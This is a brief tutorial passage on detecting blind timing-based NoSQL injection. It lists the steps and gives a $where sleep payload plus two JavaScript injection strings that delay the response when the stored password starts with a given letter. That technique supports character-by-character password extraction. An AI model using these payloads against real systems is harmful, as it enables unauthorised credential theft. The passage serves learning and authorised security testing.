1. Load the page several times to determine a baseline loading time.


2. Insert a timing based payload into the input. A timing based payload causes 
an intentional delay in the response when executed. 
For example, 
{"$where": "sleep(5000)"} causes an intentional delay of 5000 ms on successful injection.


3. Identify whether the response loads more slowly. This indicates a successful injection.


The following timing based payloads will trigger a time delay if the password beings with the letter a:

admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'

AND

admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
